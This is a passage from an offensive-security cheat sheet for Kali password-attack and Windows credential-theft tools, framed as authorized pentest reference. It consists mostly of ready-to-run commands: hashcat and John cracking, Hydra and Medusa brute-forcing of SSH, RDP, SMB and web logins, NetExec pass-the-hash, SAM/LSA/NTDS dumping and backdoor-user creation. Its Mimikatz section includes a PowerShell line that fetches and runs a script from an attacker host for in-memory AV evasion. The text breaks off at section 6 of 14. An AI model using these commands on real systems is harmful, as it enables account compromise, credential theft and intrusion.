# Kali Linux Password Attacking & Wireless Security Tools
## Authorized Penetration Testing Reference — Zia Venture Group

> **Legal Notice:** All techniques documented here are for use in authorized penetration testing, CTF competitions, and security research only. Unauthorized use against systems you do not own or have explicit written permission to test is illegal under the CFAA, ECPA, and equivalent international statutes.

---

## Table of Contents

1. [hashcat](#1-hashcat)
2. [John the Ripper](#2-john-the-ripper)
3. [Hydra](#3-hydra)
4. [Medusa](#4-medusa)
5. [CrackMapExec / NetExec (nxc)](#5-crackmapexec--netexec-nxc)
6. [Mimikatz Concepts](#6-mimikatz-concepts)
7. [Hash Capture — Responder & Evil-WinRM](#7-hash-capture--responder--evil-winrm)
8. [aircrack-ng Suite](#8-aircrack-ng-suite)
9. [wifite](#9-wifite)
10. [hcxdumptool + hcxtools](#10-hcxdumptool--hcxtools)
11. [Kismet](#11-kismet)
12. [Wireless Recon Tools](#12-wireless-recon-tools)
13. [Evil Twin / Rogue AP](#13-evil-twin--rogue-ap)
14. [End-to-End Attack Workflows](#14-end-to-end-attack-workflows)

---

## 1. hashcat

hashcat is the world's fastest GPU-accelerated password recovery tool. It supports over 350 hash types and 5 primary attack modes.

### Installation

```bash
sudo apt install hashcat          # Kali repo
hashcat --version                 # verify
```

### Attack Modes (-a)

| Mode | Name | Description |
|------|------|-------------|
| 0 | Dictionary | Single wordlist |
| 1 | Combination | Two wordlists concatenated |
| 3 | Brute-force / Mask | Exhaustive mask-based |
| 6 | Hybrid dict+mask | Wordlist left, mask appended right |
| 7 | Hybrid mask+dict | Mask left, wordlist appended right |

### Common Hash Types (-m)

| Code | Hash Type | Example Hash Format |
|------|-----------|---------------------|
| 0 | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` |
| 10 | md5($pass.$salt) | `012d73e0fab1d13eb... :salt` |
| 20 | md5($salt.$pass) | `012d73e0...:salt` |
| 100 | SHA1 | `5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8` |
| 900 | MD4 | `8846f7eaee8fb117ad06bdd830b7586c` |
| 1000 | NTLM | `8846f7eaee8fb117ad06bdd830b7586c` |
| 1400 | SHA256 | `5e884898da280471...` |
| 1700 | SHA512 | `b109f3bbbc244eb8...` |
| 1800 | sha512crypt ($6$) | `$6$rounds=5000$usesomesillystringforsa$...` |
| 3000 | LM | `299BD128C1101FD6` |
| 3200 | bcrypt ($2*$) | `$2a$05$LhayLxezLhK1LhWvKxCyLOj0j1u.Kj0jZ0pEmm134uzrQlFvQJLF6` |
| 5500 | NetNTLMv1 | `u4-netntlm::kNS:...` |
| 5600 | NetNTLMv2 | `admin::N46iSNekpT:...` |
| 7300 | IPMI2 RAKP HMAC-SHA1 | `...:...` |
| 11300 | Bitcoin/Litecoin wallet.dat | `$bitcoin$...` |
| 13100 | Kerberos 5 TGS-REP (Kerberoast) | `$krb5tgs$23$...` |
| 18200 | Kerberos 5 AS-REP (ASREPRoast) | `$krb5asrep$23$...` |
| 22000 | WPA-PBKDF2-PMKID+EAPOL | (from hcxtools) |
| 2500 | WPA/WPA2 (legacy .hccap) | (from aircrack) |
| 22100 | BitLocker | `$bitlocker$...` |
| 15300 | DPAPI masterkey | `$DPAPImk$1*...` |

### Mask Charset Reference (?a = printable, ?b = binary)

| Placeholder | Charset |
|-------------|---------|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?s` | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~ |
| `?a` | `?l` + `?u` + `?d` + `?s` |
| `?b` | 0x00 – 0xFF |

Custom charsets: `-1 ?l?d` then use `?1` in mask.

### Core Flags

```
-m <type>          Hash type (see table above)
-a <mode>          Attack mode (0/1/3/6/7)
-o <file>          Output cracked hashes to file
-r <rules>         Apply rule file
--wordlist=<file>  Alias for dictionary input
--show             Display cracked hashes from potfile
--left             Display uncracked hashes
--status           Show status during attack (non-interactive: press 's')
--status-timer=N   Auto-status every N seconds
--force            Override GPU/driver warnings (use with caution)
-O                 Optimized kernels (faster, limits password length to 32)
-w <1-4>           Workload profile (1=low, 3=high, 4=nightmare)
--increment        Auto-increment mask length (use with -a 3)
--increment-min=N  Start increment at length N
--increment-max=N  Stop increment at length N
--potfile-path=F   Custom potfile location
--potfile-disable  Do not use/update potfile
--session=<name>   Named session (for restore)
--restore          Resume named session
--username         Input file has username:hash format (ignore user field)
--hex-salt         Salt is in hex
-j <rule>          Apply single rule left (leftmost wordlist in combo)
-k <rule>          Apply single rule right (rightmost wordlist in combo)
--stdout           Do not crack; output candidates to stdout (useful for debugging rules)
```

### GPU Acceleration

```bash
# List detected devices
hashcat -I

# Use specific device
hashcat -d 1 -m 1000 hashes.txt rockyou.txt

# Use OpenCL CPU (slow, but no GPU required)
hashcat -D 1 -m 1000 hashes.txt rockyou.txt

# Benchmark all hash types on your hardware
hashcat -b

# Benchmark specific hash type
hashcat -b -m 1000
```

### Rule Files (located in /usr/share/hashcat/rules/)

| File | Description |
|------|-------------|
| `best64.rule` | 64 most effective transformations |
| `dive.rule` | Very large, comprehensive (~99k rules) |
| `d3ad0ne.rule` | Community favorite (~34k rules) |
| `rockyou-30000.rule` | Derived from RockYou analysis |
| `T0XlC.rule` | Targeted common patterns |
| `InsidePro-PasswordsPro.rule` | Old-school mangling |
| `toggles1.rule` through `toggles5.rule` | Case-toggle combos |
| `leetspeak.rule` | 1337 sp34k substitutions |

```bash
# Stack multiple rule files
hashcat -a 0 -m 1000 hashes.txt rockyou.txt -r best64.rule -r dive.rule
```

### Complete Worked Examples

```bash
# ---------- NTLM (Windows) ----------
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m 1000 -a 3 ntlm_hashes.txt ?u?l?l?l?l?d?d          # UpperLlllDD pattern
hashcat -m 1000 --show ntlm_hashes.txt                         # show previously cracked

# ---------- MD5 ----------
hashcat -m 0 -a 0 md5.txt rockyou.txt
hashcat -m 0 -a 0 md5.txt rockyou.txt -r dive.rule -O -w 3
hashcat -m 0 -a 1 md5.txt wordlist1.txt wordlist2.txt           # combo attack

# ---------- SHA1 ----------
hashcat -m 100 -a 0 sha1.txt rockyou.txt -r best64.rule

# ---------- bcrypt ----------
# bcrypt is slow — use a small, targeted wordlist
hashcat -m 3200 -a 0 bcrypt.txt /usr/share/wordlists/rockyou.txt -w 1

# ---------- sha512crypt (Linux /etc/shadow) ----------
hashcat -m 1800 -a 0 shadow.txt rockyou.txt -r best64.rule

# ---------- NetNTLMv2 (from Responder) ----------
hashcat -m 5600 -a 0 responder_hashes.txt rockyou.txt -r best64.rule

# ---------- Kerberoast (TGS-REP) ----------
hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt
hashcat -m 13100 -a 0 kerberoast_hashes.txt rockyou.txt -r dive.rule

# ---------- ASREPRoast ----------
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt

# ---------- WPA2 Handshake (legacy .hccap) ----------
hashcat -m 2500 -a 0 capture.hccap rockyou.txt
hashcat -m 2500 -a 3 capture.hccap ?d?d?d?d?d?d?d?d           # 8-digit PIN

# ---------- WPA2 via hcxtools (modern) ----------
hashcat -m 22000 -a 0 capture.hc22000 rockyou.txt

# ---------- Hybrid attack (word + 2 digits) ----------
hashcat -m 1000 -a 6 ntlm.txt rockyou.txt ?d?d

# ---------- Pure brute-force with increment ----------
hashcat -m 0 -a 3 md5.txt --increment --increment-min=4 --increment-max=8 ?a?a?a?a?a?a?a?a

# ---------- Custom charset example ----------
# Password format: 2 uppercase + 4 digits + 1 symbol
hashcat -m 1000 -a 3 ntlm.txt -1 ?u?d -2 ?s ?1?1?d?d?d?d?2

# ---------- DPAPI / BitLocker ----------
hashcat -m 15300 -a 0 dpapi.txt rockyou.txt
hashcat -m 22100 -a 0 bitlocker.txt rockyou.txt

# ---------- Check status / resume ----------
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --session=pentest1
hashcat --restore --session=pentest1
```

### Potfile Management

```bash
# Default potfile: ~/.local/share/hashcat/hashcat.potfile
cat ~/.local/share/hashcat/hashcat.potfile

# Show all cracked from a specific hash file
hashcat -m 1000 --show ntlm_hashes.txt

# Show uncracked
hashcat -m 1000 --left ntlm_hashes.txt

# Disable potfile (re-crack everything)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt --potfile-disable
```

---

## 2. John the Ripper

John the Ripper (JtR) — specifically the Jumbo community edition — is the Swiss Army knife of hash cracking. Best for single-crack mode, format conversion, and cracking exotic formats.

### Installation

```bash
sudo apt install john              # standard
# Jumbo edition (more formats, faster)
sudo apt install john-data
# Or build from source for latest
git clone https://github.com/openwall/john -b bleeding-jumbo
cd john/src && ./configure && make -s clean && make -sj4
```

### Key Binaries

| Binary | Purpose |
|--------|---------|
| `john` | Main cracker |
| `unshadow` | Combine /etc/passwd + /etc/shadow |
| `zip2john` | Extract hash from ZIP archives |
| `rar2john` | Extract hash from RAR archives |
| `pdf2john.pl` | Extract hash from encrypted PDFs |
| `ssh2john.py` | Extract hash from SSH private keys |
| `office2john.py` | Extract hash from Office docs |
| `keepass2john` | KeePass database hash extraction |
| `7z2john.pl` | 7-Zip archive hash |
| `gpg2john` | GPG private key hash |
| `bitlocker2john` | BitLocker volume hash |
| `ethereum2john` | Ethereum wallet hash |

All conversion tools output a string fed directly to john.

### Core Syntax

```bash
john [options] <hashfile>
```

### Key Flags

```
--format=<fmt>         Force specific hash format (see --list=formats)
--wordlist=<file>      Dictionary attack (required for wordlist mode)
--rules[=<ruleset>]    Apply mangling rules (default: Wordlist rules)
--rules=KoreLogic      Apply KoreLogic comprehensive rules
--incremental[=<mode>] Brute force (modes: All, Alpha, Digits, LowerNum)
--mask=<mask>          Mask attack (?l, ?u, ?d, ?s — same as hashcat)
--show                 Show cracked passwords (read potfile)
--show=LEFT            Show uncracked entries
--list=formats         List all supported formats
--list=subformats      List subformats for multi-type entries
--session=<name>       Named session for parallel runs / resume
--restore=<name>       Resume session
--status[=<name>]      Print status of running/completed session
--fork=N               Use N processes in parallel
--node=M/N             For distributed cracking (this node is M of N)
--pot=<file>           Custom potfile path
--no-log               Disable john.log
--stdout[=LENGTH]      Print candidates instead of cracking (debug)
-v / --verbosity=N     Verbosity level
```

### Format Examples

```bash
# List all formats
john --list=formats | grep -i md5
john --list=formats | grep -i ntlm
john --list=formats | grep -i bcrypt

# Common format names
# md5crypt-opencl, sha512crypt-opencl, bcrypt-opencl
# NT (NTLM), LM, mscash2, netntlmv2, krb5tgs, krb5asrep
# zip, rar5, 7z, pdf, ssh, office, keepass
```

### Cracking Modes Explained

**Single Crack Mode** — Uses username/GECOS fields to generate candidates. Often fastest first crack.

```bash
john --single --format=NT hashes.txt
```

**Wordlist Mode** — Dictionary + optional rules.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt
john --wordlist=rockyou.txt --rules hashes.txt
john --wordlist=rockyou.txt --rules=KoreLogic hashes.txt
```

**Incremental Mode** — Exhaustive brute force by character set.

```bash
john --incremental hashes.txt                  # all printable
john --incremental=Digits hashes.txt           # digits only
john --incremental=Alpha hashes.txt            # letters only
john --incremental=LowerNum hashes.txt         # lowercase + digits
```

**Mask Mode** — Targeted brute force (Jumbo only).

```bash
john --mask='?u?l?l?l?l?d?d' hashes.txt       # Titlecase + 2 digits
john --mask='?d?d?d?d?d?d?d?d' hashes.txt     # 8-digit PIN
john --mask='Pass?d?d?d' hashes.txt            # Pass followed by 3 digits
```

### Complete Worked Examples

```bash
# ---------- Linux /etc/shadow ----------
sudo unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt
john --show combined.txt

# ---------- NTLM hashes ----------
john --format=NT --wordlist=rockyou.txt --rules ntlm.txt
john --format=NT --show ntlm.txt

# ---------- NetNTLMv2 (Responder output) ----------
john --format=netntlmv2 --wordlist=rockyou.txt responder.txt

# ---------- Kerberoast ----------
john --format=krb5tgs --wordlist=rockyou.txt kerberoast.txt

# ---------- ASREPRoast ----------
john --format=krb5asrep --wordlist=rockyou.txt asrep.txt

# ---------- ZIP archive ----------
zip2john protected.zip > zip_hash.txt
john --wordlist=rockyou.txt zip_hash.txt
john --show zip_hash.txt

# ---------- RAR archive ----------
rar2john protected.rar > rar_hash.txt
john --wordlist=rockyou.txt rar_hash.txt

# ---------- Encrypted PDF ----------
pdf2john.pl protected.pdf > pdf_hash.txt
john --wordlist=rockyou.txt pdf_hash.txt

# ---------- SSH private key with passphrase ----------
ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=rockyou.txt ssh_hash.txt

# ---------- Office documents (Word/Excel) ----------
office2john.py protected.docx > office_hash.txt
john --wordlist=rockyou.txt office_hash.txt

# ---------- KeePass database ----------
keepass2john database.kdbx > keepass_hash.txt
john --wordlist=rockyou.txt keepass_hash.txt

# ---------- bcrypt ----------
john --format=bcrypt --wordlist=rockyou.txt bcrypt.txt

# ---------- Parallel with fork ----------
john --wordlist=rockyou.txt --fork=4 hashes.txt

# ---------- Distributed (2 machines) ----------
# Machine 1:
john --wordlist=rockyou.txt --node=1/2 hashes.txt
# Machine 2:
john --wordlist=rockyou.txt --node=2/2 hashes.txt

# ---------- Session management ----------
john --wordlist=rockyou.txt --session=engagement1 hashes.txt
john --status=engagement1
john --restore=engagement1

# ---------- Custom incremental config ----------
# Edit /etc/john/john.conf or ~/.john/john.conf
# Add under [Incremental:Custom]
# Charset = abcdefghijklmnopqrstuvwxyz0123456789
# MinLen = 6
# MaxLen = 8
john --incremental=Custom hashes.txt
```

### John Config File Location

```
/etc/john/john.conf       # system-wide
~/.john/john.conf         # user-specific (overrides system)
```

Key sections: `[Incremental:Alpha]`, `[Rules:Wordlist]`, `[List.Rules:KoreLogic]`

---

## 3. Hydra

Hydra is the premier online brute-force tool for network service authentication. It parallelizes login attempts across multiple protocols.

### Installation

```bash
sudo apt install hydra
hydra -h 2>&1 | head -20
```

### Core Syntax

```bash
hydra [options] <target> <service>
hydra [options] -L users.txt -P passwords.txt <target> <service>
```

### Key Flags

```
-l <login>         Single username
-L <file>          File containing usernames (one per line)
-p <pass>          Single password
-P <file>          File containing passwords
-C <file>          Colon-separated login:pass file (no -L/-P needed)
-t <tasks>         Parallel connections per target (default 16, max 64)
-T <tasks>         Total parallel tasks (for -M)
-s <port>          Non-default port
-S                 Use SSL/TLS
-f                 Stop after first valid login found (per host)
-F                 Stop after first valid login found (all hosts)
-o <file>          Output results to file
-u                 Loop around users, not passwords (try all users per pass)
-v / -V            Verbose / Very verbose (show each attempt)
-d                 Debug mode
-e nsr             Try: n=null password, s=same-as-login, r=reversed login
-x MIN:MAX:CHARSET Brute-force mode (e.g., -x 4:8:a for 4-8 lowercase)
-I                 Ignore existing restore file and start fresh
-R                 Restore previous session
-M <file>          File containing targets (one per line)
-w <secs>          Max wait time for response (default 32)
-W <secs>          Wait between connections (throttle)
-c <secs>          Wait between attempts (per connection — stealth)
-z                 Use random passwords first
-q                 Quiet mode (no banners)
```

### Service Modules

| Module | Protocol | Notes |
|--------|----------|-------|
| `ssh` | SSH | Most common; use `-t 4` to avoid lockouts |
| `ftp` | FTP | Standard file transfer |
| `ftps` | FTPS | FTP over SSL |
| `telnet` | Telnet | Legacy |
| `smtp` | SMTP | Email sending |
| `smtps` | SMTPS | SMTP over SSL |
| `imap` | IMAP | Email retrieval |
| `pop3` | POP3 | Email retrieval |
| `http-get` | HTTP Basic Auth | HTTP GET with auth |
| `http-post-form` | HTTP Form Auth | POST form login |
| `https-get` | HTTPS Basic Auth | |
| `https-post-form` | HTTPS Form Auth | |
| `http-head` | HTTP HEAD method | |
| `smb` | SMB/CIFS | Windows file shares |
| `rdp` | RDP | Windows Remote Desktop |
| `vnc` | VNC | Virtual network computing |
| `mysql` | MySQL | Database |
| `mssql` | MS SQL Server | Database |
| `postgres` | PostgreSQL | Database |
| `oracle-listener` | Oracle | |
| `ldap2` / `ldap3` | LDAP | Directory services |
| `snmp` | SNMP | Network management |
| `rsh` / `rlogin` | RSH/rlogin | Legacy Unix remote |
| `sip` | SIP/VoIP | |
| `redis` | Redis | Key-value store |
| `mongodb` | MongoDB | NoSQL |
| `cisco` | Cisco | Cisco device auth |
| `cisco-enable` | Cisco enable | |

### http-post-form Syntax

The most complex module — syntax is:

```
hydra -l <user> -P <passlist> <target> http-post-form "<path>:<post_params>:<failure_string>"
```

The third field is the indicator of failure (or use `S=<success_string>`):

```bash
# Example: WordPress login
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"

# Example: Generic form with CSRF token (must get token first)
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^&_token=abc123:F=Login failed"

# HTTPS form
hydra -l admin -P rockyou.txt -S 443 192.168.1.100 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Incorrect password"

# Use S= to detect success instead of failure
hydra -l admin -P rockyou.txt 192.168.1.100 http-post-form \
  "/login:username=^USER^&password=^PASS^:S=Dashboard"
```

### Complete Worked Examples

```bash
# ---------- SSH ----------
hydra -l root -P rockyou.txt 192.168.1.50 ssh -t 4 -V
hydra -L users.txt -P rockyou.txt 192.168.1.50 ssh -t 4 -f -o ssh_results.txt

# ---------- FTP ----------
hydra -l anonymous -P rockyou.txt 192.168.1.50 ftp
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.50 ftp -t 10

# ---------- SMB ----------
hydra -l administrator -P rockyou.txt 192.168.1.50 smb
hydra -L users.txt -P rockyou.txt 192.168.1.50 smb

# ---------- RDP ----------
hydra -l administrator -P rockyou.txt 192.168.1.50 rdp -t 4

# ---------- MySQL ----------
hydra -l root -P rockyou.txt 192.168.1.50 mysql

# ---------- MSSQL ----------
hydra -l sa -P rockyou.txt 192.168.1.50 mssql

# ---------- VNC ----------
hydra -P rockyou.txt 192.168.1.50 vnc

# ---------- SMTP ----------
hydra -l user@domain.com -P rockyou.txt -s 587 smtp.domain.com smtp

# ---------- IMAP over SSL ----------
hydra -l user@domain.com -P rockyou.txt -s 993 -S imap.domain.com imap

# ---------- HTTP Basic Auth ----------
hydra -l admin -P rockyou.txt 192.168.1.100 http-get /protected/

# ---------- Multiple targets ----------
hydra -L users.txt -P rockyou.txt -M targets.txt ssh -t 4

# ---------- Brute force mode (no wordlist) ----------
hydra -l admin -x 4:6:a 192.168.1.100 ssh          # 4-6 lowercase chars

# ---------- Rate-limited stealth ----------
hydra -l admin -P rockyou.txt 192.168.1.100 ssh -t 1 -c 30 -w 30

# ---------- Using credential pairs file ----------
# Format: login:password (one per line)
hydra -C creds.txt 192.168.1.100 ssh

# ---------- LDAP ----------
hydra -L users.txt -P rockyou.txt 192.168.1.100 ldap2
```

---

## 4. Medusa

Medusa is a parallel, speedy network login auditor. It's often faster than Hydra for certain modules due to its threading model.

### Installation

```bash
sudo apt install medusa
```

### Core Syntax

```bash
medusa -h <host> -u <user> -P <passfile> -M <module>
```

### Key Flags

```
-h <host>          Single target host
-H <file>          File containing targets
-u <username>      Single username
-U <file>          File containing usernames
-p <password>      Single password
-P <file>          Password file
-C <file>          Credential pairs file (user:pass format)
-n <port>          Port (overrides module default)
-s                 Enable SSL
-t <tasks>         Threads per host (default 1)
-T <hosts>         Parallel hosts (default 1)
-L                 Parallelize logins (one user per thread)
-f                 Stop after first valid per host
-F                 Stop after first valid globally
-O <file>          Output file
-e ns              Extended options: n=null, s=same-as-login
-M <module>        Service module name
-m <option>        Module-specific options (MODULE_OPTION:VALUE)
-v <level>         Verbosity (0-6, default 5)
-w <secs>          Error delay (default 5)
-r <retries>       Retries on error (default 3)
-R <tries>         Resume from line N in password list
-b                 Suppress startup banner
-d                 Dump all module information
```

### Available Modules

```bash
medusa -d    # list all modules with descriptions
```

Common modules: `ssh`, `ftp`, `telnet`, `smtp`, `smtps`, `imap`, `pop3`, `http`, `https`, `smb`, `mssql`, `mysql`, `postgres`, `rdp`, `vnc`, `snmp`, `web-form`, `ldap`, `nntp`, `cvs`, `svn`, `sap-r3`

### Module-Specific Options

```bash
# HTTP form POST — specify form fields
medusa -h 192.168.1.100 -u admin -P rockyou.txt -M web-form \
  -m FORM:/login \
  -m FORM-DATA:"post?username=&password=" \
  -m DENY-SIGNAL:"Login failed"

# SMB with domain
medusa -h 192.168.1.100 -u administrator -P rockyou.txt -M smb \
  -m GROUP:WORKGROUP

# MSSQL
medusa -h 192.168.1.100 -u sa -P rockyou.txt -M mssql
```

### Complete Worked Examples

```bash
# ---------- SSH ----------
medusa -h 192.168.1.50 -u root -P rockyou.txt -M ssh -t 4
medusa -h 192.168.1.50 -U users.txt -P rockyou.txt -M ssh -t 4 -f

# ---------- FTP ----------
medusa -h 192.168.1.50 -u ftpuser -P rockyou.txt -M ftp

# ---------- SMB ----------
medusa -h 192.168.1.50 -u administrator -P rockyou.txt -M smb

# ---------- RDP ----------
medusa -h 192.168.1.50 -u administrator -P rockyou.txt -M rdp -n 3389 -t 1

# ---------- MySQL ----------
medusa -h 192.168.1.50 -u root -P rockyou.txt -M mysql -t 4

# ---------- Multiple hosts from file ----------
medusa -H hosts.txt -u admin -P rockyou.txt -M ssh -T 5 -t 4

# ---------- Verbose output ----------
medusa -h 192.168.1.50 -u admin -P rockyou.txt -M ssh -v 6

# ---------- Credential pairs ----------
medusa -h 192.168.1.50 -C creds.txt -M ftp
```

---

## 5. CrackMapExec / NetExec (nxc)

CrackMapExec (CME) has been superseded by **NetExec** (`nxc`) — same codebase, actively maintained. Both commands work similarly. Essential for Windows/AD environments: credential testing, lateral movement, and post-exploitation.

### Installation

```bash
sudo apt install crackmapexec
# Or install NetExec (nxc) — newer
pip3 install netexec
# Or from GitHub
git clone https://github.com/Pennyw0rth/NetExec && cd NetExec && pip install .
```

### Core Syntax

```bash
nxc <protocol> <target(s)> [options]
crackmapexec <protocol> <target(s)> [options]
```

### Protocols

| Protocol | Port | Use Case |
|----------|------|----------|
| `smb` | 445 | Windows file sharing, authentication, enumeration |
| `winrm` | 5985/5986 | Windows Remote Management |
| `ldap` | 389/636 | Active Directory enumeration |
| `mssql` | 1433 | SQL Server auth + command exec |
| `ssh` | 22 | Linux/Unix targets |
| `rdp` | 3389 | Remote Desktop |
| `vnc` | 5900 | VNC |
| `ftp` | 21 | FTP |
| `wmi` | 135 | WMI execution |

### Authentication Flags

```
-u <user>           Single username
-U <file>           Username file
-p <pass>           Single password
-P <file>           Password file
-H <hash>           NTLM hash (pass-the-hash)
--no-bruteforce     Test one credential pair (user[0]:pass[0], user[1]:pass[1])
--continue-on-success  Don't stop after first valid credential
--local-auth        Authenticate with local (non-domain) account
-d <domain>         Domain name
--kdcHost <host>    KDC host (Kerberos auth)
-k                  Use Kerberos authentication
--aesKey <key>      AES key for Kerberos
```

### Enumeration Flags (SMB)

```
--shares            List accessible shares
--users             Enumerate domain users
--groups            Enumerate domain groups
--computers         Enumerate domain computers
--loggedon-users    Show currently logged-on users
--sessions          Show active SMB sessions
--disks             List connected disks
--rid-brute [N]     RID cycling to enumerate users (max RID N, default 4000)
--pass-pol          Dump password policy
--sam               Dump SAM database (requires admin)
--lsa               Dump LSA secrets (requires admin)
--ntds              Dump NTDS.dit (DC only, requires domain admin)
--ntds vss          NTDS via Volume Shadow Copy
--ntds drsuapi      NTDS via DCSync (faster)
--dpapi             Dump DPAPI secrets
--spider <share>    Spider (crawl) share for files
--spider-folder <f> Spider specific folder
--pattern <regex>   Only spider files matching regex
--content           Retrieve file contents while spidering
```

### Command Execution Flags

```
-x "<cmd>"          Execute command via CMD
-X "<cmd>"          Execute command via PowerShell
--exec-method       Execution method (atexec, smbexec, wmiexec, mmcexec)
```

### Module System

```bash
# List all modules for a protocol
nxc smb -L
nxc ldap -L

# Use a module
nxc smb <target> -u admin -p Pass123 -M <module>

# Key modules
# smb modules: bloodhound, gpp_autologin, gpp_password, impersonate, 
#              lsassy, nanodump, petitpotam, printerbug, 
#              procdump, rdp, slinky, spider_plus, web_delivery, zerologon
# ldap modules: bloodhound, daclread, get-network, groupmembership,
#               maq, pso, subnets, trusted-for-delegation, whoami
```

### Complete Worked Examples

```bash
# ---------- Host discovery / OS detection ----------
nxc smb 192.168.1.0/24
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# ---------- Credential testing ----------
nxc smb 192.168.1.0/24 -u administrator -p 'Password123'
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --continue-on-success
nxc smb 192.168.1.0/24 -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'  # pass-the-hash

# ---------- Local admin account ----------
nxc smb 192.168.1.0/24 -u admin -p 'localpass' --local-auth

# ---------- Enumerate shares ----------
nxc smb 192.168.1.100 -u alice -p 'Password123' --shares

# ---------- Enumerate users ----------
nxc smb 192.168.1.100 -u alice -p 'Password123' --users
nxc ldap dc01.corp.local -u alice -p 'Password123' --users

# ---------- RID brute-force (no creds needed sometimes) ----------
nxc smb 192.168.1.100 -u '' -p '' --rid-brute
nxc smb 192.168.1.100 -u 'guest' -p '' --rid-brute 5000

# ---------- Password policy ----------
nxc smb 192.168.1.100 -u alice -p 'Password123' --pass-pol

# ---------- Dump SAM (local hashes) ----------
nxc smb 192.168.1.100 -u administrator -p 'Password123' --sam

# ---------- Dump LSA secrets ----------
nxc smb 192.168.1.100 -u administrator -p 'Password123' --lsa

# ---------- DCSync (domain admin required) ----------
nxc smb dc01.corp.local -u domainadmin -p 'DomainPass!' --ntds drsuapi
nxc smb dc01.corp.local -u domainadmin -H '<hash>' --ntds vss

# ---------- Command execution ----------
nxc smb 192.168.1.100 -u administrator -p 'Password123' -x 'whoami'
nxc smb 192.168.1.100 -u administrator -p 'Password123' -X 'Get-LocalUser'
nxc smb 192.168.1.100 -u administrator -p 'Password123' -x 'net user newuser NewPass123! /add'

# ---------- WinRM (PowerShell remoting) ----------
nxc winrm 192.168.1.100 -u administrator -p 'Password123'
nxc winrm 192.168.1.100 -u administrator -p 'Password123' -x 'whoami'
nxc winrm 192.168.1.100 -u administrator -H '<ntlm_hash>'

# ---------- LDAP enumeration ----------
nxc ldap dc01.corp.local -u alice -p 'Password123' --users
nxc ldap dc01.corp.local -u alice -p 'Password123' --groups
nxc ldap dc01.corp.local -u alice -p 'Password123' --computers
nxc ldap dc01.corp.local -u alice -p 'Password123' -M bloodhound

# ---------- Kerberoasting via LDAP ----------
nxc ldap dc01.corp.local -u alice -p 'Password123' --kerberoasting kerberoast.txt

# ---------- MSSQL ----------
nxc mssql 192.168.1.100 -u sa -p 'Password123'
nxc mssql 192.168.1.100 -u sa -p 'Password123' -q 'SELECT name FROM master..sysdatabases'
nxc mssql 192.168.1.100 -u sa -p 'Password123' -x 'whoami'  # via xp_cmdshell

# ---------- Spider shares ----------
nxc smb 192.168.1.100 -u alice -p 'Password123' -M spider_plus
nxc smb 192.168.1.100 -u alice -p 'Password123' --spider C$ --pattern '\.txt$'

# ---------- LSASSY (in-memory lsass dump) ----------
nxc smb 192.168.1.100 -u administrator -p 'Password123' -M lsassy

# ---------- BloodHound data collection ----------
nxc ldap dc01.corp.local -u alice -p 'Password123' -M bloodhound --bloodhound-collection All

# ---------- GPP password search (sysvol) ----------
nxc smb dc01.corp.local -u alice -p 'Password123' -M gpp_password
nxc smb dc01.corp.local -u alice -p 'Password123' -M gpp_autologin

# ---------- Zerologon check ----------
nxc smb dc01.corp.local -u '' -p '' -M zerologon
```

### NXC Output / Database

```bash
# CME/nxc maintains a SQLite database of results
cmedb                        # interactive database shell (CME)
# In cmedb:
# hosts            — list enumerated hosts
# creds            — list captured credentials
# shares           — list enumerated shares
```

---

## 6. Mimikatz Concepts

Mimikatz is the definitive Windows credential extraction tool. It is most often executed on a target after initial access — directly, via PowerShell reflection, or through CME/nxc modules.

### Execution Methods

```powershell
# Direct (if AV allows)
mimikatz.exe

# PowerShell reflection (in-memory, AV evasion)
IEX (New-Object Net.WebClient).DownloadString('https://attacker/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Via CME
nxc smb 192.168.1.100 -u admin -p Pass123 -M mimikatz

# Via Evil-WinRM
*Evil-WinRM* PS> Invoke-Mimikatz -DumpCreds
```

### Core Commands

#### sekurlsa — LSASS Memory Extraction

```
sekurlsa::logonpasswords     # Dump all plaintext passwords, NTLM hashes, Kerberos tickets from LSASS
sekurlsa::wdigest            # Dump WDigest plaintext passwords (Win7/2008, registry tweak needed on Win8+)
sekurlsa::kerberos           # List Kerberos credentials
sekurlsa::tspkg              # TS/PKG credentials
sekurlsa::livessp            # LiveSSP credentials
sekurlsa::ssp                # SSP credentials
sekurlsa::credman            # Windows Credential Manager
sekurlsa::dpapisystem        # DPAPI system key
sekurlsa::minidump lsass.dmp # Work from a memory dump file
sekurlsa::pth                # Pass-the-hash — spawn process with alternate hash
sekurlsa::tickets            # List Kerberos tickets
sekurlsa::tickets /export    # Export .kirbi ticket files
```

#### lsadump — SAM / LSA Secrets

```
lsadump::sam                 # Dump local SAM database (NTLM hashes of local users)
lsadump::sam /system:SYSTEM /sam:SAM  # From registry hive files offline
lsadump::secrets             # Dump LSA secrets (service account creds, cached domain logons)
lsadump::cache               # Dump cached domain credentials (DCC2 hashes)
lsadump::dcsync /domain:corp.local /user:krbtgt   # DCSync — mimic DC replication to pull hashes
lsadump::dcsync /domain:corp.local /all /csv       # DCSync all users
lsadump::lsa /patch          # LSA secrets via process injection
lsadump::trust /patch        # Domain trust secrets
```

#### kerberos — Ticket Manipulation

```
